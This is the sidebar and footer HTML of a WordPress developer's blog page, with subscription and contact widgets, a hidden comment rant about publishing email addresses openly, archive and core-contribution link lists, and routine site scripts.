			<p id="subscribe-text">Enter your email address to subscribe to this blog and receive notifications of new posts by email.</p><p>Join 328 other subscribers</p>

			<p id="subscribe-email"><input type="text" name="email" value="Email Address" id="subscribe-field" onclick="if ( this.value == 'Email Address' ) { this.value = ''; }" onblur="if ( this.value == '' ) { this.value = 'Email Address'; }" /></p>

			<p id="subscribe-submit">
				<input type="hidden" name="action" value="subscribe" />
				<input type="hidden" name="source" value="http://ottopress.com/2010/anatomy-of-a-theme-malware/" />
				<input type="hidden" name="sub-type" value="widget" />
				<input type="hidden" name="redirect_fragment" value="blog_subscription-3" />
								<input type="submit" value="Subscribe" name="jetpack_subscriptions_widget" />
			</p>
		</form>

		
</li>
<li id="text-3" class="widget widget_text"><h2 class="widgettitle">Email Me</h2>
			<div class="textwidget"><ul><li><span class="vcard microid-mailto+http:sha1:23e9670868f6d2b16fe1f6b3db80c8f0423a082a">
<span style="display:none;">
<span class="adr">
 <span class="locality">Memphis</span>,
 <span class="region">TN</span>
 <span class="postal-code">38103</span>
 <span class="country-name">U.S.A.</span>
</span>
<a class="url fn" href="http://ottodestruct.com">Otto</a>
<span class="uid">240cf86e-5cad-11dc-8314-0800200c9a66</span>
</span>
<a class="email" href="mailto:otto@ottodestruct.com">otto@ottodestruct.com</a></span></li></ul>
<a rel="author" href="https://plus.google.com/100201852715113506716?rel=author">
  <img src="https://ssl.gstatic.com/images/icons/gplus-16.png" width="16" height="16">
</a>
</a>
<!-- 

This rant is hidden in HTML comments. If I pointed you to it, then you probably emailed me about the fact that my email address is in plaintext directly above this comment. If you happened to run across it because you just like looking at HTML comments, well, easter egg! :)

YES, that is a bare mailto: href above. 
YES, that is my real email address. 
And YES, it's intentional.

Obfuscating your email address on the web is stupid. 

Firstly, hiding your email address doesn't prevent spam. Spammers get addresses in bulk from mailing lists and websites and other sources. Sure, some scrapers exist, but they are by far the minority of the sources for email lists.

Secondly, hiding your email address ruins the whole point of email. The purpose of publishing my email address is so that anybody, and I do mean *anybody*, can email me. Before the days of cell phones, your phone number and physical address used to be published in a big book that everybody received, for free, on a semi-annual basis. It had distinctive yellow pages in it. Your contact information is not, and never was supposed to be, private information. Treating it as such is stupid.

Thirdly, I have great spam protection. For one, I use GMail, which has frankly incredible filtering because of the volume of mail they deal with. For another, I use various sets of filters to categorize incoming mail into various categories of things. Hell, I can even run statistics on it, if I want. This is a much better solution than continually giving out fake email addresses, or using +stuff to figure out who sent what where... I'd prefer to simply let my filters deal with it instead. 

Finally, if you're one of those systems that scours the web and/or social networks for visible email addresses and then automatically emails that person to let them know that their address is visible, then by all means please just fuck off and die. You're part of the problem. On the other hand, if you're just a regular guy with good intentions, then this doesn't apply to you. :)

Just my 2 cents.

--></div>
		</li>
<li id="categories-2" class="widget widget_categories"><h2 class="widgettitle">Categories</h2>
		<ul>
	<li class="cat-item cat-item-573"><a href="http://ottopress.com/category/code/" title="View all posts filed under Code">Code</a>
</li>
	<li class="cat-item cat-item-574"><a href="http://ottopress.com/category/other/" title="View all posts filed under Other">Other</a>
</li>
	<li class="cat-item cat-item-575"><a href="http://ottopress.com/category/rants/" title="View all posts filed under Rants">Rants</a>
</li>
	<li class="cat-item cat-item-1"><a href="http://ottopress.com/category/uncategorized/" title="View all posts filed under Uncategorized">Uncategorized</a>
</li>
	<li class="cat-item cat-item-576"><a href="http://ottopress.com/category/wordpress/" title="View all posts filed under WordPress">WordPress</a>
</li>
		</ul>
</li>
<li id="archives-2" class="widget widget_archive"><h2 class="widgettitle">Archives</h2>
		<ul>
	<li><a href='http://ottopress.com/2014/02/'>February 2014</a></li>
	<li><a href='http://ottopress.com/2013/11/'>November 2013</a></li>
	<li><a href='http://ottopress.com/2013/10/'>October 2013</a></li>
	<li><a href='http://ottopress.com/2013/06/'>June 2013</a></li>
	<li><a href='http://ottopress.com/2013/03/'>March 2013</a></li>
	<li><a href='http://ottopress.com/2012/11/'>November 2012</a></li>
	<li><a href='http://ottopress.com/2012/09/'>September 2012</a></li>
	<li><a href='http://ottopress.com/2012/08/'>August 2012</a></li>
	<li><a href='http://ottopress.com/2012/07/'>July 2012</a></li>
	<li><a href='http://ottopress.com/2012/05/'>May 2012</a></li>
	<li><a href='http://ottopress.com/2012/02/'>February 2012</a></li>
	<li><a href='http://ottopress.com/2012/01/'>January 2012</a></li>
	<li><a href='http://ottopress.com/2011/12/'>December 2011</a></li>
	<li><a href='http://ottopress.com/2011/11/'>November 2011</a></li>
	<li><a href='http://ottopress.com/2011/10/'>October 2011</a></li>
	<li><a href='http://ottopress.com/2011/09/'>September 2011</a></li>
	<li><a href='http://ottopress.com/2011/08/'>August 2011</a></li>
	<li><a href='http://ottopress.com/2011/07/'>July 2011</a></li>
	<li><a href='http://ottopress.com/2011/06/'>June 2011</a></li>
	<li><a href='http://ottopress.com/2011/05/'>May 2011</a></li>
	<li><a href='http://ottopress.com/2011/04/'>April 2011</a></li>
	<li><a href='http://ottopress.com/2011/03/'>March 2011</a></li>
	<li><a href='http://ottopress.com/2011/02/'>February 2011</a></li>
	<li><a href='http://ottopress.com/2011/01/'>January 2011</a></li>
	<li><a href='http://ottopress.com/2010/12/'>December 2010</a></li>
	<li><a href='http://ottopress.com/2010/11/'>November 2010</a></li>
	<li><a href='http://ottopress.com/2010/10/'>October 2010</a></li>
	<li><a href='http://ottopress.com/2010/09/'>September 2010</a></li>
	<li><a href='http://ottopress.com/2010/08/'>August 2010</a></li>
	<li><a href='http://ottopress.com/2010/06/'>June 2010</a></li>
	<li><a href='http://ottopress.com/2010/05/'>May 2010</a></li>
	<li><a href='http://ottopress.com/2010/04/'>April 2010</a></li>
	<li><a href='http://ottopress.com/2010/03/'>March 2010</a></li>
	<li><a href='http://ottopress.com/2010/02/'>February 2010</a></li>
	<li><a href='http://ottopress.com/2009/11/'>November 2009</a></li>
	<li><a href='http://ottopress.com/2009/09/'>September 2009</a></li>
	<li><a href='http://ottopress.com/2008/09/'>September 2008</a></li>
		</ul>
</li>
		<li id="recent-posts-2" class="widget widget_recent_entries">		<h2 class="widgettitle">Recent Posts</h2>
		<ul>
					<li>
				<a href="http://ottopress.com/2014/better-know-a-vulnerability-cross-site-request-forgery-csrf/">Better Know a Vulnerability: Cross Site Request Forgery (CSRF)</a>
						</li>
					<li>
				<a href="http://ottopress.com/2013/better-know-a-vulnerability-sql-injection/">Better Know a Vulnerability: SQL Injection</a>
						</li>
					<li>
				<a href="http://ottopress.com/2013/language-packs-101-prepwork/">Language Packs 101 &#8211; Prepwork</a>
						</li>
					<li>
				<a href="http://ottopress.com/2013/slides-a-presentation-theme/">Slides: A Presentation Theme</a>
						</li>
					<li>
				<a href="http://ottopress.com/2013/im-not-a-fan-of-orange/">I&#8217;m not a fan of orange&#8230;</a>
						</li>
				</ul>
		</li>
<li id="text-6" class="widget widget_text"><h2 class="widgettitle">WP Core Contributions</h2>
			<div class="textwidget"><p>
<a href='http://core.trac.wordpress.org/changeset/28072'>[28072]</a> - <a href='http://core.trac.wordpress.org/ticket/19393'>#19393</a><br />
<a href='http://core.trac.wordpress.org/changeset/27522'>[27522]</a> - <a href='http://core.trac.wordpress.org/ticket/19889'>#19889</a><br />
<a href='http://core.trac.wordpress.org/changeset/27399'>[27399]</a> - <a href='http://core.trac.wordpress.org/ticket/25665'>#25665</a><br />
<a href='http://core.trac.wordpress.org/changeset/26978'>[26978]</a> - <a href='http://core.trac.wordpress.org/ticket/23149'>#23149</a><br />
<a href='http://core.trac.wordpress.org/changeset/26711'>[26711]</a> - <a href='http://core.trac.wordpress.org/ticket/21442'>#21442</a><br />
<a href='http://core.trac.wordpress.org/changeset/26072'>[26072]</a> - <a href='http://core.trac.wordpress.org/ticket/25858'>#25858</a><br />
<a href='http://core.trac.wordpress.org/changeset/22152'>[22152]</a> - <a href='http://core.trac.wordpress.org/ticket/21914'>#21914</a><br />
<a href='http://core.trac.wordpress.org/changeset/22026'>[22026]</a> - <a href='http://core.trac.wordpress.org/ticket/22002'>#22002</a><br />
<a href='http://core.trac.wordpress.org/changeset/21839'>[21839]</a> - <a href='http://core.trac.wordpress.org/ticket/16996'>#16996</a><br />
<a href='http://core.trac.wordpress.org/changeset/21802'>[21802]</a> - <a href='http://core.trac.wordpress.org/ticket/18674'>#18674</a><br />
<a href='http://core.trac.wordpress.org/changeset/21776'>[21776]</a> - <a href='http://core.trac.wordpress.org/ticket/13729'>#13729</a><br />
<a href='http://core.trac.wordpress.org/changeset/21609'>[21609]</a> - <a href='http://core.trac.wordpress.org/ticket/19324'>#19324</a><br />
<a href='http://core.trac.wordpress.org/changeset/20916'>[20916]</a> - <a href='http://core.trac.wordpress.org/ticket/20448'>#20448</a><br />
<a href='http://core.trac.wordpress.org/changeset/20784'>[20784]</a> - <a href='http://core.trac.wordpress.org/ticket/20448'>#20448</a><br />
<a href='http://core.trac.wordpress.org/changeset/20783'>[20783]</a> - <a href='http://core.trac.wordpress.org/ticket/20448'>#20448</a><br />
<a href='http://core.trac.wordpress.org/changeset/20267'>[20267]</a> - <a href='http://core.trac.wordpress.org/ticket/13774'>#13774</a><br />
<a href='http://core.trac.wordpress.org/changeset/19721'>[19721]</a> - <a href='http://core.trac.wordpress.org/ticket/19626'>#19626</a><br />
<a href='http://core.trac.wordpress.org/changeset/19003'>[19003]</a> - <a href="http://core.trac.wordpress.org/ticket/17406">#17406</a><br />
<a href='http://core.trac.wordpress.org/changeset/18741'>[18741]</a> - <a href="http://core.trac.wordpress.org/ticket/15473">#15473</a><br />
<a href='http://core.trac.wordpress.org/changeset/18602'>[18602]</a> - <a href="http://core.trac.wordpress.org/ticket/18230">#18230</a><br />
<a href='http://core.trac.wordpress.org/changeset/18541'>[18541]</a> - <a href="http://core.trac.wordpress.org/ticket/16687">#16687</a><br />
<a href='http://core.trac.wordpress.org/changeset/18205'>[18205]</a> - <a href="http://core.trac.wordpress.org/ticket/17148">#17148</a><br />
<a href='http://core.trac.wordpress.org/changeset/17254'>[17254]</a> - <a href="http://core.trac.wordpress.org/ticket/16192">#16192</a><br />
<a href='http://core.trac.wordpress.org/changeset/16555'>[16555]</a> - <a href="http://core.trac.wordpress.org/ticket/12891">#12891</a><br />
<a href='http://core.trac.wordpress.org/changeset/16284'>[16284]</a> - <a href="http://core.trac.wordpress.org/ticket/13324">#13324</a><br />
<a href='http://core.trac.wordpress.org/changeset/13420'>[13420]</a> - <a href="http://core.trac.wordpress.org/ticket/12291">#12291</a><br />
<a href='http://core.trac.wordpress.org/changeset/12581'>[12581]</a> - <a href="http://core.trac.wordpress.org/ticket/7225">#7225</a><br />
<a href='http://core.trac.wordpress.org/changeset/11738'>[11738]</a> - <a href="http://core.trac.wordpress.org/ticket/10145">#10145</a><br />
<a href='http://core.trac.wordpress.org/changeset/11329'>[11329]</a> - <a href="http://core.trac.wordpress.org/ticket/3962">#3962</a><br />
<a href='http://core.trac.wordpress.org/changeset/10962'>[10962]</a> - <a href="http://core.trac.wordpress.org/ticket/3962">#3962</a><br />
<a href='http://core.trac.wordpress.org/changeset/10757'>[10757]</a> - <a href="http://core.trac.wordpress.org/ticket/3962">#3962</a><br />
<a href='http://core.trac.wordpress.org/changeset/10753'>[10753]</a> - <a href="http://core.trac.wordpress.org/ticket/3962">#3962</a><br />
<a href='http://core.trac.wordpress.org/changeset/10252'>[10252]</a> - <a href="http://core.trac.wordpress.org/ticket/6791">#6791</a><br />
<a href='http://core.trac.wordpress.org/changeset/9276'>[9276]</a> - <a href="http://core.trac.wordpress.org/ticket/7124">#7124</a><br />
<a href='http://core.trac.wordpress.org/changeset/9209'>[9209]</a> - <a href="http://core.trac.wordpress.org/ticket/7901">#7901</a><br />
<a href='http://core.trac.wordpress.org/changeset/9207'>[9207]</a> - <a href="http://core.trac.wordpress.org/ticket/7635">#7635</a><br />
<a href='http://core.trac.wordpress.org/changeset/9139'>[9139]</a> - <a href="http://core.trac.wordpress.org/ticket/7847">#7847</a><br />
<a href='http://core.trac.wordpress.org/changeset/9089'>[9089]</a> - <a href="http://core.trac.wordpress.org/ticket/7772">#7772</a><br />
<a href='http://core.trac.wordpress.org/changeset/8968'>[8968]</a> - <a href="http://core.trac.wordpress.org/ticket/7761">#7761</a><br />
<a href='http://core.trac.wordpress.org/changeset/8285'>[8285]</a> - <a href="http://core.trac.wordpress.org/ticket/6879">#6879</a><br />
<a href='http://core.trac.wordpress.org/changeset/8208'>[8208]</a> - <a href="http://core.trac.wordpress.org/ticket/4448">#4448</a><br />
<a href='http://core.trac.wordpress.org/changeset/8132'>[8132]</a> - <a href="http://core.trac.wordpress.org/ticket/4954">#4954</a><br />
<a href='http://core.trac.wordpress.org/changeset/8131'>[8131]</a> - <a href="http://core.trac.wordpress.org/ticket/6590">#6590</a><br />
<a href='http://core.trac.wordpress.org/changeset/7869'>[7869]</a> - <a href="http://core.trac.wordpress.org/ticket/6513">#6513</a><br />
<a href='http://core.trac.wordpress.org/changeset/7647'>[7647]</a> - <a href="http://core.trac.wordpress.org/ticket/6608">#6608</a><br />
<a href='http://core.trac.wordpress.org/changeset/7461'>[7461]</a> - <a href="http://core.trac.wordpress.org/ticket/6339">#6339</a><br />
<a href='http://core.trac.wordpress.org/changeset/6873'>[6873]</a> - <a href="http://core.trac.wordpress.org/ticket/4986">#4986</a><br />
<a href='http://core.trac.wordpress.org/changeset/6760'>[6760]</a> - <a href="http://core.trac.wordpress.org/ticket/4617">#4617</a><br />
<a href='http://core.trac.wordpress.org/changeset/6616'>[6616]</a> - <a href="http://core.trac.wordpress.org/ticket/5155">#5155</a><br />
<a href='http://core.trac.wordpress.org/changeset/6439'>[6439]</a> - <a href="http://core.trac.wordpress.org/ticket/2805">#2805</a><br />
<a href='http://core.trac.wordpress.org/changeset/6091'>[6091]</a> - <a href="http://core.trac.wordpress.org/ticket/4182">#4182</a><br />
<a href='http://core.trac.wordpress.org/changeset/6086'>[6086]</a> - <a href="http://core.trac.wordpress.org/ticket/4946">#4946</a><br />
<a href='http://core.trac.wordpress.org/changeset/5986'>[5986]</a> - <a href="http://core.trac.wordpress.org/ticket/4873">#4873</a><br />
<a href='http://core.trac.wordpress.org/changeset/5982'>[5982]</a> - <a href="http://core.trac.wordpress.org/ticket/4800">#4800</a><br />
<a href='http://core.trac.wordpress.org/changeset/5958'>[5958]</a> - <a href="http://core.trac.wordpress.org/ticket/4625">#4625</a><br />
<a href='http://core.trac.wordpress.org/changeset/5920'>[5920]</a> - <a href="http://core.trac.wordpress.org/ticket/4703">#4703</a><br />
<a href='http://core.trac.wordpress.org/changeset/5910'>[5910]</a> - <a href="http://core.trac.wordpress.org/ticket/4654">#4654</a><br />
<a href='http://core.trac.wordpress.org/changeset/5881'>[5881]</a> - <a href="http://core.trac.wordpress.org/ticket/4704">#4704</a><br />
<a href='http://core.trac.wordpress.org/changeset/5857'>[5857]</a> - <a href="http://core.trac.wordpress.org/ticket/4625">#4625</a><br />
<a href='http://core.trac.wordpress.org/changeset/5848'>[5848]</a> - <a href="http://core.trac.wordpress.org/ticket/4499">#4499</a><br />
<a href='http://core.trac.wordpress.org/changeset/5845'>[5845]</a> - <a href="http://core.trac.wordpress.org/ticket/4547">#4547</a><br />
<a href='http://core.trac.wordpress.org/changeset/5317'>[5317]</a> - <a href="http://core.trac.wordpress.org/ticket/4169">#4169</a><br />
<a href='http://core.trac.wordpress.org/changeset/5154'>[5154]</a> - <a href="http://core.trac.wordpress.org/ticket/4057">#4057</a><br />
<a href='http://core.trac.wordpress.org/changeset/5151'>[5151]</a> - <a href="http://core.trac.wordpress.org/ticket/4057">#4057</a><br />
<a href='http://core.trac.wordpress.org/changeset/5104'>[5104]</a> - <a href="http://core.trac.wordpress.org/ticket/3790">#3790</a><br />
<a href='http://core.trac.wordpress.org/changeset/4964'>[4964]</a> - <a href="http://core.trac.wordpress.org/ticket/3898">#3898</a><br />
</p></div>
		</li>
		</ul>
	</div>

</div>
<div id="footer">
<div style="float:left;"><a href="http://internetdefenseleague.org"><img src="http://internetdefenseleague.org/images/badges/final/footer_badge.png" alt="Member of The Internet Defense League" /></a></div>
<a href="http://ottopress.com/feed/">Entries (RSS)</a> and <a href="http://ottopress.com/comments/feed/">Comments (RSS)</a>.<br />
<span about="http://ottodestruct.com/" xmlns:cc="http://creativecommons.org/ns#">
This page, by <a property="cc:attributionName" rel="cc:attributionURL" href="http://ottodestruct.com/">Otto</a>, is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by-sa/3.0/">Creative Commons Attribution-ShareAlike License</a>.</span><br />
Powered by <a href="http://wordpress.org/" title="Powered by WordPress.">WordPress</a>.<br />
<img alt='css.php' src="http://ottopress.com/wp-content/plugins/cookies-for-comments/css.php?k=c6a73cb029f035cdaa9e9e8336d25169&amp;o=i&amp;t=750781474" width='1' height='1' />	<div style="display:none">
	<div class="grofile-hash-map-617b65fce45bfa21d94cd0c1ef2f4a56">
	</div>
	<div class="grofile-hash-map-f9bb98e439bf7efdf51993e1e70957ae">
	</div>
	<div class="grofile-hash-map-582b66ad5ae1b69c7601a990cb9a661a">
	</div>
	<div class="grofile-hash-map-b7d94091ebb84a7aceaea9f50a080285">
	</div>
	<div class="grofile-hash-map-0994d5e2e158a24ba8017c2525d78263">
	</div>
	<div class="grofile-hash-map-01cfe9feaafb068590891bbd1f6a7f5a">
	</div>
	<div class="grofile-hash-map-927540c9e8d01cb6200116183f025b66">
	</div>
	<div class="grofile-hash-map-e6f8bed544c3572b4f5380cbd097193e">
	</div>
	<div class="grofile-hash-map-afe7acd32d014da2efcd6ee49d29ecc9">
	</div>
	<div class="grofile-hash-map-1299e8d336a2d5faa4fc440d07ea44f8">
	</div>
	<div class="grofile-hash-map-a084125c824d274ff40cb834cf9f544a">
	</div>
	<div class="grofile-hash-map-529b2aac5690619ae7bdc5f5aca1e11d">
	</div>
	<div class="grofile-hash-map-45903c2f71bc776aedbe347987393c76">
	</div>
	<div class="grofile-hash-map-81717a172b6918071fbea1a52483294b">
	</div>
	<div class="grofile-hash-map-820d0e4ee14e986a44d33782ca852f51">
	</div>
	<div class="grofile-hash-map-2342de806f6b7ebc450c2b6c5046022b">
	</div>
	<div class="grofile-hash-map-9ea04cc845c7cb426fceafbe4ff2e9ed">
	</div>
	<div class="grofile-hash-map-2325869a18bc53b0315974968a939aff">
	</div>
	</div>
<script type='text/javascript' src='http://ottopress.com/wp-content/plugins/akismet/_inc/form.js?ver=3.0.1'></script>
<script type='text/javascript' src='http://ottopress.com/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shCore.js?ver=3.0.9'></script>
<script type='text/javascript' src='http://ottopress.com/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shBrushPhp.js?ver=3.0.9'></script>
<script type='text/javascript'>
	(function(){
		var corecss = document.createElement('link');
		var themecss = document.createElement('link');
		var corecssurl = "http://ottopress.com/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/styles/shCore.css?ver=3.0.9";
		if ( corecss.setAttribute ) {
				corecss.setAttribute( "rel", "stylesheet" );
				corecss.setAttribute( "type", "text/css" );
				corecss.setAttribute( "href", corecssurl );
		} else {
				corecss.rel = "stylesheet";
				corecss.href = corecssurl;
		}
		document.getElementsByTagName("head")[0].insertBefore( corecss, document.getElementById("syntaxhighlighteranchor") );
		var themecssurl = "http://ottopress.com/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/styles/shThemeDefault.css?ver=3.0.9";
		if ( themecss.setAttribute ) {
				themecss.setAttribute( "rel", "stylesheet" );
				themecss.setAttribute( "type", "text/css" );
				themecss.setAttribute( "href", themecssurl );
		} else {
				themecss.rel = "stylesheet";
				themecss.href = themecssurl;
		}
		//document.getElementById("syntaxhighlighteranchor").appendChild(themecss);
		document.getElementsByTagName("head")[0].insertBefore( themecss, document.getElementById("syntaxhighlighteranchor") );
	})();
	SyntaxHighlighter.config.strings.expandSource = '+ expand source';
	SyntaxHighlighter.config.strings.help = '?';
	SyntaxHighlighter.config.strings.alert = 'SyntaxHighlighter\n\n';
	SyntaxHighlighter.config.strings.noBrush = 'Can\'t find brush for: ';
	SyntaxHighlighter.config.strings.brushNotHtmlScript = 'Brush wasn\'t configured for html-script option: ';
	SyntaxHighlighter.defaults['pad-line-numbers'] = false;
	SyntaxHighlighter.defaults['toolbar'] = false;
	SyntaxHighlighter.all();
</script>
<link rel='stylesheet' id='gplus-css'  href='http://ottopress.com/wp-content/plugins/jetpack/modules/gplus-authorship/style.css?ver=3.9.1' type='text/css' media='all' />
<link rel='stylesheet' id='yarppRelatedCss-css'  href='http://ottopress.com/wp-content/plugins/yet-another-related-posts-plugin/style/related.css?ver=3.9.1' type='text/css' media='all' />
<script type='text/javascript' src='http://ottopress.com/wp-includes/js/comment-reply.js?ver=3.9.1'></script>
<script type='text/javascript' src='http://ottopress.com/wp-content/plugins/jetpack/modules/photon/photon.js?ver=20130122'></script>
<script type='text/javascript' src='http://s0.wp.com/wp-content/js/devicepx-jetpack.js?ver=201430'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var mejsL10n = {"language":"en-US","strings":{"Close":"Close","Fullscreen":"Fullscreen","Download File":"Download File","Download Video":"Download Video","Play\/Pause":"Play\/Pause","Mute Toggle":"Mute Toggle","None":"None","Turn off Fullscreen":"Turn off Fullscreen","Go Fullscreen":"Go Fullscreen","Unmute":"Unmute","Mute":"Mute","Captions\/Subtitles":"Captions\/Subtitles"}};
var _wpmejsSettings = {"pluginPath":"\/wp-includes\/js\/mediaelement\/"};
/* ]]> */
</script>
<script type='text/javascript' src='http://ottopress.com/wp-includes/js/mediaelement/mediaelement-and-player.min.js?ver=2.14.2'></script>
<script type='text/javascript' src='http://ottopress.com/wp-includes/js/mediaelement/wp-mediaelement.js?ver=3.9.1'></script>
<script type='text/javascript' src='http://s.gravatar.com/js/gprofiles.js?ver=2014Julaa'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var WPGroHo = {"my_hash":""};
/* ]]> */
</script>
<script type='text/javascript' src='http://ottopress.com/wp-content/plugins/jetpack/modules/wpgroho.js?ver=3.9.1'></script>
<script type='text/javascript' src='//apis.google.com/js/plusone.js?ver=3.9.1'></script>

	<script src="http://stats.wordpress.com/e-201430.js" type="text/javascript"></script>
	<script type="text/javascript">
	st_go({v:'ext',j:'1:3.0.2',blog:'12342457',post:'355',tz:'-5'});
	var load_cmc = function(){linktracker_init(12342457,355,2);};
	if ( typeof addLoadEvent != 'undefined' ) addLoadEvent(load_cmc);
	else load_cmc();
	</script></div></div>

<script type="text/javascript">
    window._idl = {};
    _idl.variant = "modal";
    (function() {
        var idl = document.createElement('script');
        idl.type = 'text/javascript';
        idl.async = true;
        idl.src = ('https:' == document.location.protocol ? 'https://' : 'http://') + 'members.internetdefenseleague.org/include/?url=' + (_idl.url || '') + '&campaign=' + (_idl.campaign || '') + '&variant=' + (_idl.variant || 'banner');
        document.getElementsByTagName('body')[0].appendChild(idl);
    })();
</script>

</body>
</html>
	
